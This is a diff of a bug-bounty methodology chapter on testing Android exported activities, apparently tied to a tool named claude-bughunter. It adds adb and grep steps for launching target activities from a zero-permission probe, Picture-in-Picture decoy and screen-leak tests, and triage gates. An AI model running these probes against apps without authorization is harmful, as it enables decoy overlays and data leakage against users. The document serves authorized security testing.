-    (.request.headers  |= map(if .name|ascii_downcase|IN("cookie","authorization","x-csrf-token") then .value="<REDACTED>" else . end)) |
-    (.response.headers |= map(if .name|ascii_downcase|IN("set-cookie") then .value="<REDACTED>" else . end)) |
-    (.request.cookies  |= map(.value="<REDACTED>")) |
-    (.response.cookies |= map(.value="<REDACTED>")))' in.har > out.sanitized.har
-  grep -i 'authorization\|"cookie"' out.sanitized.har | head -20    # verify
-  ```
-- **Proof:** Five numbered, cross-referenced images plus the PoC APK's `AndroidManifest.xml` showing an
-  empty permission set. **Leave visible** what the triager needs to correlate: trace ids
-  (`x-request-id`, `x-datadog-trace-id`), your own attacker uid and package name, JSON key names, and
-  bot-management/analytics cookies (`__cf_bm`, `_cfuvid`, `_ga`). Mask session cookies, `Authorization`,
-  and third-party PII. Rotate the test account's session and password after submission so anything visible
-  in a screenshot is dead.
-- **Escalation:** This is what converts a D04 primitive into a report a triager can validate without asking
-  you a question.
-- **Ruled out when:** n/a — this is a standard, not a test. The failure mode it prevents is a
-  not-reproducible close on a genuine finding.
-
+- **Test:** Covered by D27-037; this row keeps the sweep honest. The exported-activity specifics: shot 2 is the `am start` (or the PoC's log) and the change succeeding without auth, and the PoC APK's `AndroidManifest.xml` with its empty permission set is attached beside the five images.
+- **How:** see D27-037 — run it once there; record the activity-side fact in `inventory/components.csv` notes and the `D04-065` row as `covered-by D27-037`.
+- **Proof:** as D27-037.
+- **Escalation:** -> D27-037; this is what converts a D04 primitive into a report a triager can validate without asking you a question.
+- **Ruled out when:** as D27-037 — the mechanism and the controlled experiment live there; this row closes when that row closes.
 ### D04-066 · Chain filing: primitives first, consumer second, then backfill
 
 | | |
@@ -2494,6 +2536,7 @@ Exact note text for the partial case (write it once in `engagement.json.domains_
 | **Severity ceiling** | Support |
 | **VRT** | n/a |
 | **Applies to** | every D04 chain (exported activity -> WebView -> token -> ATO; exported activity -> URI grant -> provider read) |
+| **Requires** | — |
 | **Attacker** | n/a |
 | **Maps to** | claude-bughunter `bugcrowd-reporting` §5 and submission-order strategy §8 |
 
@@ -2528,32 +2571,14 @@ Exact note text for the partial case (write it once in `engagement.json.domains_
 | **VRT** | governs every P1/P2 claim originating in this chapter |
 | **Attacker** | n/a |
 | **Applies to** | every "exported activity = authentication bypass" claim |
+| **Requires** | — |
 | **Maps to** | claude-bughunter `triage-validation` PRE-SEVERITY GATE and retraction discipline |
 
-- **Test:** Write the draft Critical title, then substitute the Critical claim for "the bug" in each
-  question:
-  1. Have I validated the **full** chain to attacker-attainable impact, or only one primitive in the middle?
-     "The activity rendered" is a primitive, not impact.
-  2. What does the attacker walk away with, in one concrete sentence?
-  3. Have I personally reproduced the full chain end to end **at least twice** — once during discovery, once
-     for the PoC?
-  4. Is there still a gate in the chain: a server-side ownership check, a signature check, an audience check,
-     the BAL restriction (D04-038)? If yes, it is not Critical — file it as "primitive present" at a lower
-     severity.
-  5. Has the program rejected this severity class before? (For this domain: Google Mobile VRP rejects
-     StrandHogg and tapjacking variants and secondary lockscreen bypasses outright.)
-- **How:** Re-run the PoC cold on a freshly-installed build, from the zero-permission APK, on the stock
-  non-rooted device, and capture it again. Then apply D04-009 to the API half.
-- **Proof:** Two independent end-to-end reproductions, timestamped, with the gate question answered
-  explicitly in the report body.
-- **Escalation:** When a finding does not survive the gate, write the retraction into the report as a
-  retraction appendix rather than silently dropping it — that is what preserves the client's trust in the
-  rest of the report. The inverse also holds: **do not retract a confirmed finding that stopped reproducing
-  because the client patched mid-engagement.** Keep the timestamped pre-patch evidence and say when it was
-  captured.
-- **Ruled out when:** n/a — this is a gate. Its failure mode is a retracted Critical against production
-  infrastructure, which costs more than the finding was worth.
-
+- **Test:** Covered by D13-006; this row keeps the sweep honest. The exported-activity specifics: "the activity rendered" is a primitive, not impact; the BAL precondition (D04-038) is a gate in the chain; Google Mobile VRP rejects StrandHogg, tapjacking variants and secondary lockscreen bypasses outright — re-run the PoC cold on a fresh install from the zero-permission APK on the stock device, then apply D04-009 to the API half.
+- **How:** see D13-006 — run it once there; record the activity-side fact in `inventory/components.csv` notes and the `D04-067` row as `covered-by D13-006`.
+- **Proof:** as D13-006.
+- **Escalation:** -> D13-006; a finding that does not survive the gate is retracted in a retraction appendix, never silently dropped, and a confirmed finding that stopped reproducing because the client patched mid-engagement keeps its timestamped pre-patch evidence.
+- **Ruled out when:** as D13-006 — the mechanism and the controlled experiment live there; this row closes when that row closes.
 ### D04-068 · Quick Settings `TileService` performs its action, or launches its activity, over the keyguard
 
 | | |
@@ -2572,8 +2597,8 @@ Exact note text for the partial case (write it once in `engagement.json.domains_
   D04-056: `showWhenLocked` is the manifest route to the same boundary, the tile is the user-facing one.
 - **How:**
   ```bash
-  grep -nA8 'android.service.quicksettings.action.QS_TILE' out/AndroidManifest.xml
-  grep -rnE 'class .*TileService|onClick\(|isLocked\(\)|isSecure\(\)|unlockAndRun|startActivityAndCollapse' out/sources/
+  grep -nA8 'android.service.quicksettings.action.QS_TILE' $DEC/apktool/AndroidManifest.xml
+  grep -rnE 'class .*TileService|onClick\(|isLocked\(\)|isSecure\(\)|unlockAndRun|startActivityAndCollapse' $DEC/jadx/sources/
   ```
   On device: add the tile through the shade editor, set a real PIN, then:
   ```bash
@@ -2613,15 +2638,14 @@ Exact note text for the partial case (write it once in `engagement.json.domains_
 - **How:** Establish presence under every coordinate the family has used, because an SCA rule keyed on one
   `groupId` sees at most a third of a forked library:
   ```bash
-  ./gradlew :app:dependencies --configuration releaseRuntimeClasspath > deps.txt
-  grep -niE "theartofdev|arthurhub|canhub|vanniktech" deps.txt
-  grep -rniE "com\.theartofdev|com\.github\.arthurhub|com\.canhub|com\.vanniktech" \
-    --include='*.gradle' --include='*.gradle.kts' --include='*.toml' .
-  grep -rn "jitpack.io" --include='*.gradle*' --include='settings.gradle*' .
+  # version and coordinates as shipped in the APK — a bounty engagement has no source tree or deps.txt
+  unzip -l "$E/apk/base.apk" | grep -iE 'META-INF/.*(cropper|canhub|theartofdev|vanniktech).*\.version'
+  grep -rhoE 'com\.(canhub|theartofdev\.edmodo|github\.arthurhub|vanniktech)[A-Za-z0-9_.]*' $DEC/jadx/sources/ | sort | uniq -c
   # class-level check — survives coordinate renaming and JitPack mirrors of archived forks entirely
-  jadx -d out base.apk
-  grep -rn "CropImageActivity\|CropImageView\|writeBitmapToUri\|customOutputUri\|CROP_IMAGE_EXTRA_BUNDLE\|CROP_IMAGE_EXTRA_OPTIONS" out/sources/
-  grep -n "CropImageActivity" out/AndroidManifest.xml
+  grep -rn "CropImageActivity\|CropImageView\|writeBitmapToUri\|customOutputUri\|CROP_IMAGE_EXTRA_BUNDLE\|CROP_IMAGE_EXTRA_OPTIONS" $DEC/jadx/sources/
+  grep -n "CropImageActivity" $DEC/apktool/AndroidManifest.xml
+  grep -rnE 'CropImageOptions|customOutputUri|writeBitmapToUri' $DEC/jadx/sources/ | head   # 4.7.0+ validates the Uri before writing: read the path check in writeBitmapToUri
+  # source-assisted engagements only: ./gradlew :app:dependencies --configuration releaseRuntimeClasspath | grep -iE 'theartofdev|arthurhub|canhub|vanniktech'
   ```
   Then drive it from the zero-permission PoC (D04-005):
   ```java
@@ -2637,7 +2661,7 @@ Exact note text for the partial case (write it once in `engagement.json.domains_
   Generalise the class beyond this one library — any exported activity whose extras reach a `FileOutputStream`,
   `openOutputStream` or `writeBitmapToUri`:
   ```bash
-  grep -rnE 'openOutputStream\(|new FileOutputStream\(|writeBitmapToUri' out/sources/ -B12 \
+  grep -rnE 'openOutputStream\(|new FileOutputStream\(|writeBitmapToUri' $DEC/jadx/sources/ -B12 \
     | grep -nE 'getIntent\(\)|getParcelableExtra|EXTRA_OUTPUT|outputUri'
   ```
 - **Proof:** `stat` or `run-as ls -l` showing the target file's size and mtime changed to your bitmap, plus
@@ -2649,11 +2673,11 @@ Exact note text for the partial case (write it once in `engagement.json.domains_
   own read path is -> D07. The abandonment argument is separate and belongs with D02/D17: the ArthurHub
   repository is unmaintained with development halted at 2.8.0, so no advisory stream will ever flag it and
   "our scanner says we're clean" is not evidence.
-- **Ruled out when:** The library version in `deps.txt` is at or above the fixed line (CanHub 4.7.0+) **and**
-  the class-level `grep` finds no vulnerable class in the dex, **or** the activity is declared
-  `android:exported="false"` in the merged manifest and a direct start from the zero-permission PoC returns
-  `SecurityException: Permission Denial`. A clean SCA report on its own is never the negative here — the
-  class-level grep is.
+- **Ruled out when:** The dex contains no `CropImageActivity`/`writeBitmapToUri`, **or** the shipped
+  `writeBitmapToUri` rejects a destination outside the library's own directory (read the method — the
+  4.7.0+ fix), **or** the activity is declared `android:exported="false"` in the merged manifest and a direct
+  start from the zero-permission PoC returns `SecurityException: Permission Denial`. A build file, a
+  `deps.txt` or a clean SCA report is never the negative here — the shipped class is.
 
 ### D04-070 · Exported engine/player activity whose extras are consumed by game or framework code
 
@@ -2673,7 +2697,7 @@ Exact note text for the partial case (write it once in `engagement.json.domains_
   router in D04-018.
 - **How:**
   ```bash
-  grep -n -A15 'com.unity3d.player' out/AndroidManifest.xml
+  grep -n -A15 'com.unity3d.player' $DEC/apktool/AndroidManifest.xml
   # recover the managed method/field table, then search it for intent reads
   # (Il2CppDumper over libil2cpp.so + global-metadata.dat produces dump.cs)
   grep -nE 'getIntent|AndroidJavaObject|currentActivity|getStringExtra|getBooleanExtra|Application\.absoluteURL' dump.cs | head -40
@@ -2707,7 +2731,7 @@ Exact note text for the partial case (write it once in `engagement.json.domains_
   widget is drawn by the system process from `RemoteViews`, so none of the in-app protections apply to it.
 - **How:**
   ```bash
-  grep -rnE 'AppWidgetProvider|RemoteViews\(|setTextViewText|setImageViewBitmap|setPendingIntentTemplate' out/sources/
+  grep -rnE 'AppWidgetProvider|RemoteViews\(|setTextViewText|setImageViewBitmap|setPendingIntentTemplate' $DEC/jadx/sources/
   adb shell dumpsys appwidget | sed -n '/Provider/,/Host/p'
   # add the widget, then read what it renders without unlocking
   adb shell input keyevent KEYCODE_SLEEP; adb shell input keyevent KEYCODE_WAKEUP
@@ -2733,6 +2757,7 @@ Exact note text for the partial case (write it once in `engagement.json.domains_
 | **VRT** | governs every claim in this chapter |
 | **Attacker** | n/a — kill gate |
 | **Applies to** | every item above |
+| **Requires** | — |
 | **Maps to** | claude-bughunter `bb-methodology` PART 4 — Marker Discipline, the Body-Diff Rule, the Statistical-Sample Rule, Server-Policy-vs-State and the Shell-Loop Ban; `triage-validation` 7-Question Gate |
 
 - **Test:** This domain produces four claim shapes, and each has a matching false positive that triage knows
@@ -2775,6 +2800,35 @@ Exact note text for the partial case (write it once in `engagement.json.domains_
 - **Ruled out when:** n/a — this is a gate. Its failure mode is the four rejected-as-N/A categories:
   marker collision, status-code-only bypass, single-outlier timing, and a silent sweep read as coverage.
 
+### D04-073 · Picture-in-Picture as a permission-free float surface — `supportsPictureInPicture` on an exported or sensitive activity
+
+| | |
+|---|---|
+| **Severity ceiling** | Medium; P5 for the leak half alone |
+| **VRT** | `broken_access_control.exposed_sensitive_android_intent` (varies) for the decoy; `insecure_data_storage.screen_caching_enabled` (P5) for the leak half |
+| **Attacker** | AM-03 for the decoy; AM-11 for the leak |
+| **Applies to** | API 26+ (`supportsPictureInPicture`); auto-enter (`setAutoEnterEnabled`) API 31+ |
+| **Requires** | exported-activity, device |
+| **Maps to** | `develop/ui/views/picture-in-picture` (PiP windows float above other apps and the launcher; `setAutoEnterEnabled(true)` enters PiP on the home gesture without a tap); MASWE-0036; contrast D04-040 (bubbles) and D04-047..-053 (overlays) |
+| **Record** | logs/D04-073.txt (the manifest and code hits, the `dumpsys activity activities` pinned-stack lines); screenshots/D04-073-1.png (`pip.png`) |
+
+- **Skip when:** `grep -c 'supportsPictureInPicture="true"' $DEC/apktool/AndroidManifest.xml` prints 0 and `grep -rlE 'enterPictureInPictureMode|PictureInPictureParams' $DEC/jadx/sources/ | wc -l` prints 0 — write `n/a: no activity declares or enters Picture-in-Picture (merged manifest, N splits; 0 code sites)`.
+- **Test:** An activity that declares `android:supportsPictureInPicture="true"` (with `resizeableActivity`) can shrink itself into a floating window over any app with no overlay permission — a third float surface beside bubbles (D04-040) and `SYSTEM_ALERT_WINDOW` overlays (D04-047). Two questions: can an external caller start it and have it enter PiP (a decoy that stays on top of the victim's next screen), and does a sensitive screen auto-enter PiP on the home gesture so its content keeps floating after the user believes they left it?
+- **How:**
+  ```bash
+  grep -nE 'supportsPictureInPicture="true"' -B3 $DEC/apktool/AndroidManifest.xml
+  grep -rnE 'enterPictureInPictureMode|PictureInPictureParams|setAutoEnterEnabled|onPictureInPictureModeChanged|onUserLeaveHint' $DEC/jadx/sources/
+  # decoy half: start the PiP-capable exported activity from the zero-permission probe, then send the victim home
+  adb shell am start -S -a probe.fire.1 -n com.sanehunters.probe/.MainActivity --es run start --es victim com.target.app --es component .PlayerActivity
+  sleep 2; adb shell input keyevent KEYCODE_HOME
+  adb shell dumpsys activity activities | grep -iE 'pinned|PictureInPicture|mPipBounds|WINDOWING_MODE_PINNED'
+  adb exec-out screencap -p > pip.png
+  ```
+  For the leak half, open the sensitive screen normally, press Home, and take the same `dumpsys`/`screencap` pair.
+- **Proof:** `dumpsys` showing the target activity in the pinned (PiP) stack over another app after a start from the zero-permission probe; for the leak half, `pip.png` showing account, OTP or message content in the floating window after the home gesture with no unlock or re-auth.
+- **Escalation:** Decoy over a confirm screen -> D04-048 / D04-049 (the PiP window is exempt from the overlay-permission reasoning, so it survives the Android 12 restrictions that kill D04-047); leaked content -> D04-042 (`FLAG_SECURE` does not blank a PiP window the owner is looking at) and -> D20 privacy.
+- **Ruled out when:** No activity declares `supportsPictureInPicture`, or the only PiP activities are media players whose PiP content is the media alone and whose `onPictureInPictureModeChanged` hides every overlaid account element — verified by the `screencap` after the home gesture showing media only, and by the probe-started activity refusing to enter PiP (`enterPictureInPictureMode` returns false / no pinned stack in `dumpsys`).
+
 ## Graveyard for this domain
 
 | Observation | Why it is not a finding | What would make it one |
@@ -2813,9 +2867,9 @@ Exact note text for the partial case (write it once in `engagement.json.domains_
 - **Android platform documentation** — `guide/topics/manifest/activity-element` and `activity-alias-element` (`documentLaunchMode`, `excludeFromRecents`, `autoRemoveFromRecents`, `noHistory`, `allowEmbedded`, `knownActivityEmbeddingCerts`, `requireContentUriPermissionFromCaller`, `showForAllUsers`, `directBootAware`, launchMode table); `guide/components/activities/tasks-and-back-stack`; `guide/components/activities/background-starts` (BAL rules, `allowCrossUidActivitySwitchFromBelow`); `about/versions/12/behavior-changes-12` (explicit `exported`, notification trampolines, `NOTIFICATION_TRAMPOLINE_BLOCK`, untrusted-touch blocking); `about/versions/14/behavior-changes-14`; `about/versions/15/behavior-changes-15` and `/15/features` (`ComponentCaller`, `checkContentUriPermissionFull()`, edge-to-edge); `about/versions/16/behavior-changes-16` (`intentMatchingFlags`, predictive back, orientation/aspect-ratio, Safer Intents); `guide/navigation/custom-back/predictive-back-gesture`; `develop/ui/views/notifications/bubbles`; `develop/ui/views/quicksettings-tiles`.
 - **Google security-risk articles** — `risks/android-exported`, `risks/access-control-to-exported-components`, `risks/intent-redirection`, `risks/strandhogg`, `risks/tapjacking`.
 - **Google VRP doctrine** — Mobile VRP non-qualifying list ("Variants of Strandhogg and Tapjacking", "Secondary lockscreen bypasses"); Invalid Reports "Intended Behavior" and the three tapjacking carve-outs; Android & Google Devices in-scope impacts and the lockscreen-bypass tier.
-- **OWASP MASTG / MASVS** — MASTG-TEST-0364, -0340, -0289, -0291, -0292, -0293, -0294, -0029; MASTG-TECH-0160, -0164, -0172, -0002; MASTG-KNOW-0017, -0022, -0132; MASTG-TOOL-0004, -0015; MASTG-BEST-0040; MASWE-0018, -0023, -0036, -0038, -0039, -0040; MASVS-PLATFORM-1/-3, MASVS-AUTH-1. Verified against `data/mastg-android-tests.csv` and `data/mastg-android-techniques.csv`.
-- **Bugcrowd VRT release 2026-07-08** (`data/bugcrowd-vrt-full.csv`, 581 entries) — the P5 pinning of `mobile_security_misconfiguration.tapjacking`, `insecure_data_storage.screen_caching_enabled` and `application_level_denial_of_service_dos.app_crash.malformed_android_intents`, and the P1/P2/P3 paths this chapter converts into.
-- **MITRE ATT&CK Mobile** (`data/mitre-attack-mobile-android.csv`) — T1417/T1417.002, T1453, T1516, T1624.001, T1626/T1626.001, T1628/T1628.001, T1629.001, T1655.001.
+- **OWASP MASTG / MASVS** — MASTG-TEST-0364, -0340, -0289, -0291, -0292, -0293, -0294, -0029; MASTG-TECH-0160, -0164, -0172, -0002; MASTG-KNOW-0017, -0022, -0132; MASTG-TOOL-0004, -0015; MASTG-BEST-0040; MASWE-0018, -0023, -0036, -0038, -0039, -0040; MASVS-PLATFORM-1/-3, MASVS-AUTH-1. Verified against `data/mastg-tests.csv` and `data/mastg-techniques.csv`.
+- **Bugcrowd VRT release 2026-07-08** (`data/vrt.csv`, 581 entries) — the P5 pinning of `mobile_security_misconfiguration.tapjacking`, `insecure_data_storage.screen_caching_enabled` and `application_level_denial_of_service_dos.app_crash.malformed_android_intents`, and the P1/P2/P3 paths this chapter converts into.
+- **MITRE ATT&CK Mobile** (`data/attack-mobile-android.csv`) — T1417/T1417.002, T1453, T1516, T1624.001, T1626/T1626.001, T1628/T1628.001, T1629.001, T1655.001.
 - **AOSP security-model paper** — threat classes [T.A2], [T.A4], [T.A5], [T.A6], [T.A7]; Table 3 (Android 12–13 passthrough-touch restrictions; `SYSTEM_ALERT_WINDOW` moved to special permissions in 6.x). AOSP severity guidance for persistent vs temporary local DoS and lockscreen bypass.
 - **Disclosed HackerOne reports** — #499348 (Twitter Lite, Critical), #283058, #2555949, #532836, #694053, #414101, #1737358, #189793, #43988, #3764217, #3829030, #637194, #1825679, #1784645, #50884, #377107, #161710, #288955, #258460, #1454002, #1408692, #55064, #145402, #951691, #65729, #1061211, #1325649.
 - **Research and write-ups** — TapTrap (USENIX Security 2025, TU Wien, taptrap.click); Oversecured "Gaining access to arbitrary Content Providers" and "Discovering vendor-specific vulnerabilities in Android"; Promon StrandHogg / CVE-2020-0096; the bugscale Samsung S25 `IapReceiver` restart-oracle chain; Yousef Elsheikh `CheckoutActivity`; m_kamal `LoginSelectorActivity`/`orig_uri`; ghandar0x `AuthAnswerActivity`; Raju Kumar `SaveToMediumActivity`; Niraj Kharel's parameter brute-force list; sec-88 "Task Hijacking" and "Exported Activity Hacking"; HackTricks `android-task-hijacking.md`, `tapjacking.md`, `accessibility-services-abuse.md`, `android-checklist.md`; Mobile Hacking Lab "Android Intent Security: Exploiting Exported Components and Deep Links"; YesWeHack Android recon guide; EDB 49563.
